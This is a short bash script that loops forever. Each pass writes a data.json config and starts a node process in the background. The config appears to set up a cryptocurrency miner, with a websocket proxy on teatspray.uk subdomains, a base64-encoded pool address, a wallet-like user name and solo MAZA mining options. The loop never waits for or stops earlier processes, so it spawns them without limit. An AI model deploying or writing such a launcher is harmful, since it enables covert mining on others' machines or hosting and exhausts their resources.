#!/bin/bash

# Infinite loop to repeat the process
while true; do
  
  # Ensure the node executable has the proper permissions
  chmod +x ./node
  
  # Write the configuration to data.json

  cat <<EOF > data.json
  {
    "proxy": "ws://cpusocks$(shuf -i 1-6 -n 1).teatspray.uk:9999/Y29pbnhwLnRlYXRzcHJheS51azo4MjQz",
    "config": { "threads": 1, "log": true },
    "options": { "user": "MGaypRJi43LcQxrgoL2CW28B31w4owLvv8.Test", "password": "c=MAZA,m=solo", "argent": "Web-Wasm-Reloaded/1.0" }
  }
EOF

  # Start the node process in the background and capture its PID
  ./node app.js &
  pid=$!

done
